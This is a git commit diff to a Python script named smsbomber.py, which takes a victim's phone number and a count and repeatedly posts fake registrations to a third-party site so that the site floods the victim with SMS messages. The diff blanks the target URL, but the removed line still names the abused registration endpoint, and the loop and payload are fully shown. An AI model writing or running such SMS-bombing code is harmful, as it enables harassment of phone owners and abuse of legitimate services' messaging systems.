6e4f8f45b03806c8051ce4155b4e15d32c1dab97
Faraaz khan <khanfaraaz27@gmail.com>
2023-01-18 11:38:53 +0530

    Update smsbomber.py

--- smsbomber.py
+++ smsbomber.py
@@ -4,7 +4,7 @@ num=input("enter number:")
 rg=int(input("enter sms quantity:"))
 values = range(rg)
 for i in values:
-	h='https://gochanakya.com/registration_ajax/'
+	h=''
 	payload={'first_name':'a','phone_varify':'0','last_name':'a','user_id':'','work_phone':num}
 	r=requests.post(h,data=payload,timeout=10)
 	print(r.json())
